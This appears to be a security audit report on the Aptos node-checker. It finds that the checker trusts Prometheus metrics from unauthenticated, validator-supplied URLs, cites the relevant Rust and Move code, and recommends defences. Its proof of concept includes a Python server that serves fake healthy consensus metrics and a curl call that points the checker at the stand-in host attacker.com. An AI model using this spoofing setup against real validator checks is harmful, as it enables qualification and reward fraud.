# Audit Report

## Title
Metrics Endpoint Impersonation Enables Validator Health Check Bypass Through Unauthenticated Endpoint Access

## Summary
The node-checker system accepts arbitrary URLs for metrics endpoints without cryptographic verification, authentication, or domain validation. Validators can register attacker-controlled network addresses on-chain, allowing them to serve fake Prometheus metrics that show healthy consensus behavior, bypassing AIT (Aptos Incentivized Testnet) validation requirements and potentially gaining validator qualification without proper infrastructure.

## Finding Description

The vulnerability spans multiple components in the node-checker system:

**1. Unauthenticated Metrics Fetching**

The `MetricsProvider::get_scrape()` function performs HTTP requests to user-provided URLs without any validation: [1](#0-0) 

The function simply makes an HTTP GET request to the configured URL, retrieves the response text, and parses it as Prometheus metrics. There is no authentication, no TLS certificate validation, no verification that the metrics actually originate from the claimed node, and no cryptographic proof of authenticity.

**2. User-Controlled URL in API Endpoint**

The `/check` API endpoint accepts user-provided URLs directly from query parameters: [2](#0-1) 

The `node_url` parameter is taken directly from user input and used to construct a `NodeAddress` with no validation that the URL actually belongs to the node being checked or that it's a legitimate endpoint.

**3. Unrestricted On-Chain Address Registration**

Validators can register arbitrary network addresses on-chain without validation: [3](#0-2) 

The `update_network_and_fullnode_addresses` function accepts arbitrary `vector<u8>` encoded addresses with only operator authentication checks, but no validation that the addresses are legitimate, reachable, or actually belong to the validator.

**4. AIT Validation Dependency**

The fn-check-client retrieves validator addresses from on-chain data and queries the node-checker: [4](#0-3) [5](#0-4) 

The results are used for AIT validation by pushing to BigQuery for validator qualification assessment.

**5. Consensus Timeout Check Vulnerability**

The specific check mentioned in the security question blindly trusts these metrics: [6](#0-5) 

The checker compares consensus timeout metrics between two scrapes, but if both scrapes come from an attacker-controlled endpoint, the comparison is meaningless.

**Attack Path:**

1. **Direct API Exploitation**: Attacker calls `/check?node_url=http://attacker.com&metrics_port=9101`
2. **On-Chain Registration Attack**: 
   - Validator registers on-chain with VFN address pointing to `http://attacker-controlled-server.com`
   - fn-check-client retrieves this address from the validator set
   - Queries node-checker with the attacker-controlled URL
   - Attacker serves fake metrics showing zero consensus timeouts and healthy behavior
3. **DNS/MITM Attack**: If validator registers a domain name, attacker compromises DNS or performs MITM to redirect metrics queries

**Example Fake Metrics Response:**
```
# TYPE aptos_consensus_timeout_count counter
aptos_consensus_timeout_count 0

# TYPE aptos_consensus_round gauge  
aptos_consensus_round 1000000

# TYPE aptos_consensus_proposals_count counter
aptos_consensus_proposals_count 50000
```

## Impact Explanation

**High Severity** - This vulnerability enables significant protocol violations:

1. **AIT Validation Bypass**: Validators can fake passing AIT requirements without running proper infrastructure, undermining the integrity of the validator qualification process.

2. **Validator Set Manipulation**: Unqualified validators could gain network access by presenting fake health metrics.

3. **Monitoring System Compromise**: The entire node health checking infrastructure becomes untrustworthy if metrics can be arbitrarily faked.

4. **Reward Fraud Potential**: If AIT performance correlates with rewards or network privileges, attackers gain unfair advantages.

This meets the High Severity criteria of "Significant protocol violations" as the node-checker is part of the validator qualification protocol for Aptos networks.

## Likelihood Explanation

**High Likelihood**:

- **Low Technical Barrier**: Requires only a simple HTTP server to serve fake Prometheus metrics
- **No Cryptographic Protection**: No signatures, certificates, or challenge-response mechanisms to bypass
- **Direct API Access**: The `/check` endpoint is publicly accessible
- **Easy Automation**: Attack can be fully automated
- **On-Chain Registration**: Validators control their own network addresses via `update_network_and_fullnode_addresses`

## Recommendation

Implement multiple layers of defense:

**1. Cryptographic Metrics Signing**
```rust
// Add signature verification to metrics
pub struct SignedMetrics {
    pub metrics: Scrape,
    pub signature: Ed25519Signature,
    pub timestamp: u64,
}

impl MetricsProvider {
    pub async fn get_scrape(&self) -> Result<Scrape, ProviderError> {
        let response = self.client.get(self.metrics_url.clone()).send().await?;
        let signed_metrics: SignedMetrics = response.json().await?;
        
        // Verify signature using node's public key
        verify_metrics_signature(&signed_metrics, &self.expected_public_key)?;
        
        Ok(signed_metrics.metrics)
    }
}
```

**2. Cross-Reference with Blockchain Data**
- Compare metrics with actual on-chain consensus participation
- Verify consensus rounds match blockchain height
- Check validator signatures in recent blocks

**3. Challenge-Response Verification**
- Issue random challenges to the metrics endpoint
- Require cryptographic proof of node identity
- Implement time-bound nonces to prevent replay

**4. TLS Certificate Validation**
- Require HTTPS with valid certificates
- Pin certificates or use certificate transparency
- Validate domain ownership

**5. Anomaly Detection**
- Flag metrics that deviate from blockchain reality
- Cross-check with multiple peers
- Implement rate limiting and timeout detection

## Proof of Concept

**Simple HTTP Server Serving Fake Metrics (Python):**

```python
from http.server import HTTPServer, BaseHTTPRequestHandler

class FakeMetricsHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/metrics':
            # Serve fake healthy metrics
            fake_metrics = """# TYPE aptos_consensus_timeout_count counter
aptos_consensus_timeout_count 0

# TYPE aptos_consensus_round gauge
aptos_consensus_round 1000000

# TYPE aptos_consensus_proposals_count counter
aptos_consensus_proposals_count 50000
"""
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(fake_metrics.encode())
        else:
            self.send_response(404)
            self.end_headers()

# Run server
server = HTTPServer(('0.0.0.0', 9101), FakeMetricsHandler)
print("Serving fake metrics on port 9101...")
server.serve_forever()
```

**Exploitation Steps:**

1. Run the fake metrics server: `python3 fake_metrics.py`
2. Call node-checker API:
```bash
curl "http://nhc-server:20121/check?baseline_configuration_id=devnet_fullnode&node_url=http://attacker.com&metrics_port=9101"
```
3. Node-checker queries attacker.com:9101/metrics and reports healthy consensus behavior
4. For on-chain attack: Register validator with VFN address pointing to attacker-controlled server via `aptos node update-validator-network-addresses`

## Notes

This vulnerability represents a fundamental trust issue where the system being monitored controls its own health metrics without cryptographic proof of authenticity. The lack of authentication allows complete impersonation of node health status, undermining the integrity of the AIT validation process and potentially enabling unqualified validators to join the network.

### Citations

**File:** ecosystem/node-checker/src/provider/metrics.rs (L59-85)
```rust
    pub async fn get_scrape(&self) -> Result<Scrape, ProviderError> {
        let response = self
            .client
            .get(self.metrics_url.clone())
            .send()
            .await
            .with_context(|| format!("Failed to get data from {}", self.metrics_url))
            .map_err(|e| ProviderError::RetryableEndpointError("/metrics", e))?;
        let body = response
            .text()
            .await
            .with_context(|| {
                format!(
                    "Failed to process response body from {} as text",
                    self.metrics_url
                )
            })
            .map_err(|e| ProviderError::ParseError(anyhow!(e)))?;
        Scrape::parse(body.lines().map(|l| Ok(l.to_string())))
            .with_context(|| {
                format!(
                    "Failed to parse response text from {} as a Prometheus scrape",
                    self.metrics_url
                )
            })
            .map_err(|e| ProviderError::ParseError(anyhow!(e)))
    }
```

**File:** ecosystem/node-checker/src/server/api.rs (L29-87)
```rust
    #[oai(path = "/check", method = "get")]
    async fn check(
        &self,
        /// The ID of the baseline node configuration to use for the evaluation, e.g. devnet_fullnode
        baseline_configuration_id: Query<String>,
        /// The URL of the node to check, e.g. http://44.238.19.217 or http://fullnode.mysite.com
        node_url: Query<Url>,
        /// If given, we will assume the metrics service is available at the given port.
        metrics_port: Query<Option<u16>>,
        /// If given, we will assume the API is available at the given port.
        api_port: Query<Option<u16>>,
        /// If given, we will assume that clients can communicate with your node via noise at the given port.
        noise_port: Query<Option<u16>>,
        /// A public key for the node, e.g. 0x44fd1324c66371b4788af0b901c9eb8088781acb29e6b8b9c791d5d9838fbe1f.
        /// This is only necessary for certain checkers, e.g. HandshakeChecker.
        public_key: Query<Option<String>>,
    ) -> poem::Result<Json<CheckSummary>> {
        // Ensure the public key, if given, is in a valid format.
        let public_key = match public_key.0 {
            Some(public_key) => match x25519::PublicKey::from_encoded_string(&public_key) {
                Ok(public_key) => Some(public_key),
                Err(e) => {
                    return Err(poem::Error::from((
                        StatusCode::BAD_REQUEST,
                        anyhow!("Invalid public key \"{}\": {:#}", public_key, e),
                    )))
                },
            },
            None => None,
        };

        let baseline_configuration = self
            .baseline_configurations
            .0
            .get(&baseline_configuration_id.0)
            .context(format!(
                "Baseline configuration {} does not exist",
                baseline_configuration_id.0
            ))
            .map_err(|e| poem::Error::from((StatusCode::BAD_REQUEST, e)))?;

        // Within a single NHC run we want to use the same client so that cookies
        // can be collected and used. This is important because the nodes we're
        // talking to might be a behind a LB that does cookie based sticky routing.
        // If we don't do this, we can get read inconsistency, e.g. where we read
        // that the node has transaction version X, but then we fail to retrieve the
        // transaction at the version because the LB routes us to a different node.
        // In this function, which comprises a single NHC run, we build a NodeAddress
        // for the target and use that throughout the request. Further functions
        // deeper down might clone these structs, but that is fine, because the
        // important part, the CookieStore (Jar) is in an Arc, so each time we clone
        // the struct we're just cloning the reference to the same jar.
        let target_node_address = NodeAddress::new(
            node_url.0,
            api_port.0,
            metrics_port.0,
            noise_port.0,
            public_key,
        );
```

**File:** aptos-move/framework/aptos-framework/sources/stake.move (L955-995)
```text
    public entry fun update_network_and_fullnode_addresses(
        operator: &signer,
        pool_address: address,
        new_network_addresses: vector<u8>,
        new_fullnode_addresses: vector<u8>,
    ) acquires StakePool, ValidatorConfig {
        check_stake_permission(operator);
        assert_reconfig_not_in_progress();
        assert_stake_pool_exists(pool_address);
        let stake_pool = borrow_global_mut<StakePool>(pool_address);
        assert!(signer::address_of(operator) == stake_pool.operator_address, error::unauthenticated(ENOT_OPERATOR));
        assert!(exists<ValidatorConfig>(pool_address), error::not_found(EVALIDATOR_CONFIG));
        let validator_info = borrow_global_mut<ValidatorConfig>(pool_address);
        let old_network_addresses = validator_info.network_addresses;
        validator_info.network_addresses = new_network_addresses;
        let old_fullnode_addresses = validator_info.fullnode_addresses;
        validator_info.fullnode_addresses = new_fullnode_addresses;

        if (std::features::module_event_migration_enabled()) {
            event::emit(
                UpdateNetworkAndFullnodeAddresses {
                    pool_address,
                    old_network_addresses,
                    new_network_addresses,
                    old_fullnode_addresses,
                    new_fullnode_addresses,
                },
            );
        } else {
            event::emit_event(
                &mut stake_pool.update_network_and_fullnode_addresses_events,
                UpdateNetworkAndFullnodeAddressesEvent {
                    pool_address,
                    old_network_addresses,
                    new_network_addresses,
                    old_fullnode_addresses,
                    new_fullnode_addresses,
                },
            );
        };
    }
```

**File:** ecosystem/node-checker/fn-check-client/src/check.rs (L189-210)
```rust
    async fn check_single_fn_one_api_port(
        &self,
        nhc_client: &ReqwestClient,
        nhc_address: &Url,
        node_url: &Url,
        api_port: u16,
        noise_port: u16,
        public_key: Option<x25519::PublicKey>,
    ) -> SingleCheckResult {
        // Build up query params.
        let mut params = HashMap::new();
        params.insert("node_url", node_url.to_string());
        params.insert("api_port", api_port.to_string());
        params.insert("noise_port", noise_port.to_string());
        params.insert(
            "baseline_configuration_name",
            self.nhc_baseline_config_name.clone(),
        );
        if let Some(public_key) = public_key {
            params.insert("public_key", public_key.to_encoded_string().unwrap());
        }

```

**File:** ecosystem/node-checker/fn-check-client/src/get_vfns.rs (L85-141)
```rust
            let vfn_addresses = match validator_info.config().fullnode_network_addresses() {
                Ok(vfn_addresses) => vfn_addresses,
                Err(e) => {
                    invalid_node_address_results
                        .entry(*account_address)
                        .or_insert_with(Vec::new)
                        .push(SingleCheck::new(
                            SingleCheckResult::CouldNotDeserializeNetworkAddress(
                                CouldNotDeserializeNetworkAddress {
                                    message: format!("{:#}", e),
                                },
                            ),
                            None,
                        ));
                    continue;
                },
            };

            if vfn_addresses.is_empty() {
                invalid_node_address_results
                    .entry(*account_address)
                    .or_insert_with(Vec::new)
                    .push(SingleCheck::new(
                        SingleCheckResult::NoVfnRegistered(NoVfnRegistered),
                        None,
                    ));
                continue;
            }

            for vfn_address in vfn_addresses.into_iter() {
                let (node_url, noise_port) = match extract_network_address(&vfn_address) {
                    Ok(result) => result,
                    Err(e) => {
                        invalid_node_address_results
                            .entry(*account_address)
                            .or_insert_with(Vec::new)
                            .push(SingleCheck::new(
                                SingleCheckResult::IncompleteNetworkAddress(
                                    IncompleteNetworkAddress {
                                        message: format!("{:#}", e),
                                    },
                                ),
                                None,
                            ));
                        continue;
                    },
                };
                node_infos
                    .entry(*account_address)
                    .or_insert_with(Vec::new)
                    .push(NodeInfo {
                        node_url,
                        api_port: None,
                        noise_port,
                        public_key: vfn_address.find_noise_proto(),
                    });
            }
```

**File:** ecosystem/node-checker/src/checker/consensus_timeouts.rs (L95-153)
```rust
    async fn check(
        &self,
        providers: &ProviderCollection,
    ) -> Result<Vec<CheckResult>, CheckerError> {
        let target_metrics_provider = get_provider!(
            providers.target_metrics_provider,
            self.config.common.required,
            MetricsProvider
        );

        let first_scrape = match target_metrics_provider.provide().await {
            Ok(scrape) => scrape,
            Err(e) => {
                return Ok(vec![Self::build_result(
                    "Failed to check consensus timeouts".to_string(),
                    0,
                    format!(
                        "Failed to scrape metrics from your node (1st time): {:#}",
                        e
                    ),
                )])
            },
        };

        tokio::time::sleep(target_metrics_provider.config.common.check_delay()).await;

        let second_scrape = match target_metrics_provider.provide().await {
            Ok(scrape) => scrape,
            Err(e) => {
                return Ok(vec![Self::build_result(
                    "Failed to check consensus timeouts".to_string(),
                    0,
                    format!(
                        "Failed to scrape metrics from your node (2nd time): {:#}",
                        e
                    ),
                )])
            },
        };

        let mut check_results = vec![];

        let previous_round = self
            .get_consensus_timeouts(&first_scrape, "first")
            .unwrap(&mut check_results);

        let latest_round = self
            .get_consensus_timeouts(&second_scrape, "second")
            .unwrap(&mut check_results);

        if !check_results.is_empty() {
            return Ok(check_results);
        }

        Ok(vec![self.build_check_result(
            previous_round.unwrap(),
            latest_round.unwrap(),
        )])
    }
```
